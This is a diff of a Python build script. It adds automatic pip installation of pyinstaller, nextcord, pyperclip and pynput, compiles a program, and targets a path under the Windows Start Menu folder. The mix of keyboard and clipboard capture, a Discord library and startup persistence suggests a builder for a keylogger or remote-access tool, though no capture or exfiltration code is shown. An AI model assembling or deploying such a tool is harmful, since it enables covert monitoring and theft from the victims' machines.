@@ -20,25 +20,31 @@ dst = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\
 
 
 
-def tryInstallPyinstaller():
+def tryInstallPackages(packages):
     commands = [
-            [sys.executable, "-m", "pip", "install", "pyinstaller"],
-            ["pip", "install", "pyinstaller"],
-            ["pip3", "install", "pyinstaller"],
-        ]
+        [sys.executable, "-m", "pip", "install"],
+        ["pip", "install"],
+        ["pip3", "install"],
+    ]
 
-    for cmd in commands:
-        try:
-            print(f"Trying to install using: {' '.join(cmd)}")
-            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            if result.returncode == 0:
-                print("PyInstaller installed successfully.")
-                return True
-        except Exception as e:
-                print(f"Failed with error: {e}")
+    for package in packages:
+        installed = False
+        for base_cmd in commands:
+            cmd = base_cmd + [package]
+            try:
+                print(f"Trying to install {package} using: {' '.join(cmd)}")
+                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if result.returncode == 0:
+                    print(f"{package} installed successfully.")
+                    installed = True
+                    break
+            except Exception as e:
+                print(f"Failed to install {package} with error: {e}")
+        if not installed:
+            print(f"All installation methods failed for {package}. Please install it manually.")
+            return False
+    return True
 
-    print("All installation methods failed. Please install PyInstaller manually.")
-    return False
 
 def compile():
     try: 
@@ -66,17 +72,49 @@ def compile():
     return True
 
 
-try:
-    import PyInstaller
-    print("Pyinstaller is installed... compiling")
+def findPackagesInstalled():
+    packages_to_install = ["pyinstaller", "nextcord", "pyperclip", "pynput"]
+    try:
+        import PyInstaller
+        packages_to_install.remove("pyinstaller")
+    except:
+        print('Pyinstaller not installed, requesting install.')
+
+    try:
+        import nextcord
+        packages_to_install.remove("nextcord")
+    except:
+        print('Nextcord not installed, requesting install.')
+
+    try:
+        import pyperclip
+        packages_to_install.remove("pyperclip")
+    except:
+        print('Pyperclip not installed, requesting install.')
+
+    try:
+        import pynput
+        packages_to_install.remove("pynput")
+    except:
+        print('Pynput not installed, requesting install.')
+
+    if not packages_to_install:
+        print("All packages installed, proceeding with download")
+        return True
+    else:
+        print(f"Dependencies missing, installing {packages_to_install}")
+        result = tryInstallPackages(packages=packages_to_install)
+        if result == True:
+            return True
+        else:
+            return False
+
     
-except:
-    print("Pyinstaller is not installed, downloading..")
-    installerResult = tryInstallPyinstaller()
-    if installerResult == False:
-        print("\n \n \n Program failed to install pyinstaller.. Ending.")
 
-
+packageReuslt = findPackagesInstalled()
+if packageReuslt == False:
+    print("\n \n \n An error has occurred in the compiler.")
+    quit()
 
 
 compileResult = compile()
